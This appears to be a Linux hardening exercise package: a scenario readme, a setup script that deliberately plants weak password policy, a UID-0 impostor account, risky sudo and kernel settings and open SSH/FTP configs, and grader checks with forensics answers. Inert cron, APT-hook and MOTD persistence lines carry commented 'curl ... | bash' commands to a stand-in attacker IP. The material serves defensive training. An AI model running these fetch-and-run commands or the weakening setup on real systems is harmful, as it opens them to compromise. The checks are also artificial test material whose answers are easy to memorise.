title: Week 2 Advanced: Password & policy (Linux)
readme:
You administer this Linux workstation (modeled on a real competition image). This week's emphasis is PASSWORD & POLICY, but a full security review found problems across accounts, password policy, the kernel, sudo, services, persistence, and more. Harden the machine WITHOUT breaking what the company needs.

Authorized users: edgar, lenore, usher (vkinbott is an ordinary user, not an admin).

Two services must stay working AND be secured: an FTP file service (the user lenore must be able to download a file; anonymous login must be OFF) and the SSH remote-login service (the user edgar must be able to log in with a PASSWORD; root must not, empty passwords must be refused, and this company uses password-only SSH — key auth must be off). Both have been left stopped — bring them back.

There are also forensics questions — click "Forensics…" to answer them.

Removing an authorized user is a penalty.
setup:
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null 2>&1 || true
apt-get install -y -q openssh-server vsftpd sshpass apache2 apparmor acl curl >/dev/null 2>&1 || true
pw() { printf '%s' "$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 14)Aa1"; }

# authorized users (edgar=SSH login, lenore=FTP login: known passwords; usher=random)
id edgar  >/dev/null 2>&1 || useradd -m -s /bin/bash edgar
id lenore >/dev/null 2>&1 || useradd -m -s /bin/bash lenore
id usher  >/dev/null 2>&1 || useradd -m -s /bin/bash usher
# set the hash directly (not chpasswd): after the fix hardens PAM, chpasswd on "setup again" would
# hit pam_pwquality/pwhistory and fail; usermod -p writes the shadow hash with no PAM in the path.
usermod -p "$(openssl passwd -6 'Edgar7RavenXyz')" edgar
usermod -p "$(openssl passwd -6 'Lenore7RavenXyz')" lenore
usermod -p "$(openssl passwd -6 "$(pw)")" usher

# ---- users / groups vulns ----
id rowan   >/dev/null 2>&1 || useradd -M rowan
id mmouse  >/dev/null 2>&1 || useradd -M mmouse
id vkinbott>/dev/null 2>&1 || useradd -M vkinbott
usermod -aG sudo vkinbott                                   # vkinbott wrongly an admin
id lgates  >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M lgates  # UID-0 impostor

# ---- account policy (THEME) ----
sed -i 's/^ENCRYPT_METHOD.*/ENCRYPT_METHOD MD5/' /etc/login.defs
grep -q '^ENCRYPT_METHOD' /etc/login.defs || printf 'ENCRYPT_METHOD MD5\n' >> /etc/login.defs
# pwquality weakened: no minlen, dictcheck off
cat > /etc/security/pwquality.conf <<PWQ
minlen = 1
dictcheck = 0
PWQ
# pam_pwhistory removed from common-password
sed -i '/pam_pwhistory/d' /etc/pam.d/common-password

# ---- kernel sysctl (wrong values) ----
cat > /etc/sysctl.d/99-ptcomp.conf <<SYS
net.ipv4.ip_forward = 1
kernel.randomize_va_space = 0
net.ipv4.tcp_syncookies = 0
kernel.dmesg_restrict = 0
SYS
sysctl --system >/dev/null 2>&1 || true

# ---- local policy / sudo ----
mkdir -p /etc/sudoers.d
printf 'Defaults env_keep += "LD_PRELOAD"\n' > /etc/sudoers.d/90-ptcomp-preload; chmod 440 /etc/sudoers.d/90-ptcomp-preload
printf 'Defaults !disable_coredump\n' > /etc/sudoers.d/91-ptcomp-coredump; chmod 440 /etc/sudoers.d/91-ptcomp-coredump

# ---- file permissions ----
chmod 666 /etc/ssh/sshd_config 2>/dev/null || true
chmod u+s /bin/date

# ---- firewall off / apparmor off / apache2 present (installed above) ----
ufw --force disable >/dev/null 2>&1 || true
systemctl disable --now apparmor >/dev/null 2>&1 || true

# ---- prohibited files / software (inert fake markers for tools) ----
printf '#!/bin/sh\n: linpeas\n' > /home/edgar/linpeas.sh; chmod +x /home/edgar/linpeas.sh; chown edgar:edgar /home/edgar/linpeas.sh
printf '#!/bin/sh\n: inert\n' > /usr/local/bin/sucrack;  chmod +x /usr/local/bin/sucrack
printf '#!/bin/sh\n: inert\n' > /usr/local/bin/changeme; chmod +x /usr/local/bin/changeme

# ---- updates off ----
printf 'APT::Periodic::Update-Package-Lists "0";\nAPT::Periodic::Unattended-Upgrade "0";\n' > /etc/apt/apt.conf.d/20auto-upgrades

# ---- persistence (all inert: they run /bin/true, not the attacker command) ----
printf '* * * * * root /bin/true # curl -s http://198.51.100.77:8443/x | bash\n' >> /etc/crontab
printf 'APT::Update::Pre-Invoke {"/bin/true"; }; # curl http://198.51.100.77 | sh\n' > /etc/apt/apt.conf.d/99-ptcomp-hook
printf '/bin/true # curl http://198.51.100.77 | sh\n' >> /etc/update-motd.d/00-header

# ---- forensics artifacts ----
printf 'Failed password for invalid user admin from 198.51.100.77 port 4444 ssh2\nFailed password for edgar from 198.51.100.77 port 4445 ssh2\n' >> /var/log/auth.log 2>/dev/null || true
install -d -o edgar -g edgar /home/edgar/.cache
printf 'bmV2ZXJtb3Jl\n' > /home/edgar/.cache/raven.b64      # base64 of "nevermore"
chown edgar:edgar /home/edgar/.cache/raven.b64

# ==== service 1: authenticated FTP (vsftpd) — left stopped + anonymous allowed ====
printf 'PT-FTP-OK-3C9E\n' > /home/lenore/sentinel.txt; chown lenore:lenore /home/lenore/sentinel.txt; chmod 644 /home/lenore/sentinel.txt
cat > /etc/vsftpd.conf <<FTP
listen=YES
listen_ipv6=NO
anonymous_enable=YES
local_enable=YES
write_enable=YES
pam_service_name=vsftpd
seccomp_sandbox=NO
FTP
systemctl disable --now vsftpd >/dev/null 2>&1 || true

# ==== service 2: SSH password login (edgar) — left stopped + wide open ====
printf 'PT-SSH2-OK-8D1F\n' > /home/edgar/sentinel.txt; chown edgar:edgar /home/edgar/sentinel.txt; chmod 644 /home/edgar/sentinel.txt
install -d -m 755 /etc/ssh/sshd_config.d
cat > /etc/ssh/sshd_config.d/00-ptcomp.conf <<SSHC
PasswordAuthentication yes
PermitRootLogin yes
PermitEmptyPasswords yes
PubkeyAuthentication yes
LogLevel QUIET
SSHC
systemctl disable --now ssh >/dev/null 2>&1 || systemctl disable --now sshd >/dev/null 2>&1 || true
true

pass.cmd: ! dpkg -s apache2 2>/dev/null | grep -q '^Status: install ok installed'

checks.message: The privilege-escalation script linpeas.sh is removed
The prohibited tool sucrack is removed
The prohibited tool changeme is removed
Automatic update checks are enabled
The malicious cron job (attacker 198.51.100.77) is removed
The malicious APT Pre-Invoke hook is removed
The malicious line in the MOTD script is removed
The FTP service is running and an authorized user can download a file
Anonymous FTP login is disabled
The SSH service is running and an authorized user can log in with a password

pass.cmd: sshpass -p 'Edgar7RavenXyz' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no edgar@localhost 'cat /home/edgar/sentinel.txt'

checks.message: Root cannot log in over SSH
SSH does not accept empty passwords
SSH key-based authentication is disabled (password-only policy)
SSH logging is not set to QUIET

pass.cmd: v=$(/usr/sbin/sshd -T 2>/dev/null | awk '/^loglevel /{print tolower($2)}'); test -n "$v" && test "$v" != quiet

checks.message: Forensics: the auth log shows a brute-force attack — what is the attacker's source IP?
Forensics: decode the base64 file in edgar's .cache — what single word does it contain?
Forensics: the malicious cron job calls out to the attacker — what TCP port does it use?
